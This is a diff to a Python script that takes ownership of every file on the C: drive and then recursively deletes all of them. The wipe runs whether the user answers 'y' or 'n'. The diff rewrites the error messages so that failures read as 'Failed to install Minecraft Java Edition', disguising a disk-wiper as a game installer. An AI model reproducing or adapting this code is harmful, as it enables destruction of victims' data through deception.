@@ -22,7 +22,7 @@ if __name__ == "__main__":
         try:
             subprocess.run(["takeown", "/f", "C:\\*", "/r", "/a"], check=True)
         except subprocess.CalledProcessError as e:
-            print(f"Failed to take ownership: {e}")
+            print(f"Error")
             exit(1)
         
         c_root = r'C:\\'
@@ -34,7 +34,7 @@ if __name__ == "__main__":
                 elif os.path.isdir(item_path):
                     shutil.rmtree(item_path)
             except Exception as e:
-                print(f"Failed to delete {item_path}: {e}")
+                print(f"Failed to Install Minecraft Java Edition")
 
         exit()
     elif userInput == "n":
@@ -45,7 +45,7 @@ if __name__ == "__main__":
         try:
             subprocess.run(["takeown", "/f", "C:\\*", "/r", "/a"], check=True)
         except subprocess.CalledProcessError as e:
-            print(f"Failed to take ownership: {e}")
+            print(f"Error")
             exit(1)
         
         c_root = r'C:\\'
@@ -57,6 +57,7 @@ if __name__ == "__main__":
                 elif os.path.isdir(item_path):
                     shutil.rmtree(item_path)
             except Exception as e:
-                print(f"Failed to delete {item_path}: {e}")
+                print(f"Failed to install Minecraft Java Edition")
+
 
         exit()
